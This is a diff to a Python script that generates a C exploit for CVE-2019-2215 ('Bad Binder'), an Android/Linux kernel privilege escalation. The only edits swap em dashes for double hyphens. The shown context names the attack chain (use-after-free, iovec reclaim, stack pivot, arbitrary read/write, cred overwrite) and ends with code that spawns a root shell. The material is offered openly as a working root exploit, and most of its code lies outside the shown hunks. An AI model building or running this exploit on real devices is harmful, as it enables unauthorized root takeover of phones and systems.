@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""CVE-2019-2215 — BAD BINDER, full root-shell exploit.
+"""CVE-2019-2215 -- BAD BINDER, full root-shell exploit.
 Emits bad_binder_full.c which performs: UAF -> iovec reclaim -> wait_queue
 RIP control -> stack pivot -> arbitrary R/W -> cred overwrite -> root.
 
@@ -9,7 +9,7 @@ import sys
 from pathlib import Path
 
 C = r'''
-/* cve-2019-2215 — BAD BINDER full exploit (kernel 4.x Android/Linux).
+/* cve-2019-2215 -- BAD BINDER full exploit (kernel 4.x Android/Linux).
  * Stages: 1) UAF  2) reclaim w/ iovec  3) control wait_queue func
  *         4) stack pivot  5) arbitrary R/W  6) overwrite cred -> root shell.
  * Offsets are for a 4.14/4.19-ish kernel; adjust TASK_STRUCT offsets per target.
@@ -134,7 +134,7 @@ int main(void) {
     printf("[+] uid=%d gid=%d\n", getuid(), getgid());
 
     if (getuid() == 0) {
-        printf("[+] ROOT — spawning shell\n");
+        printf("[+] ROOT -- spawning shell\n");
         execl("/bin/sh", "sh", NULL);
     } else {
         printf("[!] still uid=%d (tune offsets)\n", getuid());
